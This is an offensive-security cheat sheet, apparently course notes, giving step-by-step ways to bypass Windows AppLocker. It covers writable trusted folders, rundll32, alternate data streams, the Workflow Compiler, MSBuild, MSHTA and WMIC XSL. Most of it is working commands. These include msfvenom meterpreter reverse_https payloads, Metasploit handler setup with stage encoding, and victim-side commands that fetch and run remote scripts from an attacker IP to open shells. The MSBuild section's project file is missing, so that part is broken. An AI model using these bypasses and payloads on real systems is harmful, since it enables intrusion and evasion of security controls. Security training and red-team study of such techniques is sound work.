Note: AppLocker rules do not apply to the built-in local accounts such as Local System, Local Service, or Network Service. Neither do they apply to the IIS DefaultAppPool account

## Trusted Folder Bypass ##

1. Use SysInternals AccessChk to check writable folder under `C:\Windows`. These means writable. Also can check the following:\
`C:\Program Files`\
`C:\Program Files (x86)`

```
accesschk.exe "username" C:\Windows -wus
```

2. Next use icacls from results above to check if it is executable (in this example C:\Windows\Task). If RX means can write and can execute.:
`icacls.exe C:\Windows\Tasks`

3. Can just copy shellcode to this folder to bypass AppLocker.

## Bypass with DLL ##

1. If DLL block is not enabled, can just use DLL to bypass it (in example below the function name in DLL is `run`).
`rundll32 C:\Tools\TestDll.dll,run`

## Alternate Data Streams ##

1. First you need to find a writable and executable file and in trusted location (similar to Trusted Folder Bypass). Then write your exploit js into it:
`type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"`

2. Excute it using wscript:
`wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"`

## Third Party Execution ##

1. <b>VBA Code in Microsoft Office</b>, Python, Perl, Java and other third party scripting engine can always bypass AppLocker.

## Arbitrary C# Using Workflow Compiler ##

1. Run the following PowerShell code:

```
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "test.txt"
$output = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output
```

2\. Then the following (change student to the actual username). You need to run this as admin. If fail also can try to continue:

```
$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
```

3\. Create test.txt with the following C# code:

```
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

4\. Run the following command using cmd:

```
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

## Arbitrary C# shellcode using MSBuild ##

1. Generate shellcode using msfvenom:\
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`

2. Save the following file as test.csproj with the shellcode replaced:

```

3\. Ready for shell:
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit
```

4\. Run the following on victim:\
`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe test.csproj`

## Arbitrary JScript Using MSHTA ##

1. Create the .js file using method listed in Antivirus Evasion -> Methods -> Full Process Hollowing + AMSI with Jscript.

2. Slightly modify the .js file content as below:

```
<html> 
<head>
</head> 
<body>
<script language="JScript">

ORIGINAL JS FILE CONTENT HERE

</script>
</body> 
</html>
```

3\. Rename the file to runner.hta

4\. Prepare for shell:
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit
```

5a\. Execute (important, must use full path!)\
`mshta c:\users\offsec\documents\runner.hta`

5b\. Or to create a shortcut, right click on desktop and select New -> Shortcut:\
`C:\Windows\System32\mshta.exe http://IP/runner.hta`

## Arbitrary JScript Using XSL ##

1. Create the .js file using method listed in Antivirus Evasion -> Methods -> Full Process Hollowing + AMSI with Jscript.

2. Slightly modify the .js file content as below:

```
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

	<ms:script implements-prefix="user" language="JScript">
		<![CDATA[

        ORIGINAL JS FILE CONTENT HERE

        ]]>
	</ms:script>
</stylesheet>
```

3\. Rename the file to runner.xsl, and host it on your Kali machine. Remember to do:\
`sudo systemctl restart apache2`

4\. Prepare for shell:
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit
```

5\. Run the following in victim:\
`wmic process get brief /format:"http://IP/runner.xsl"`
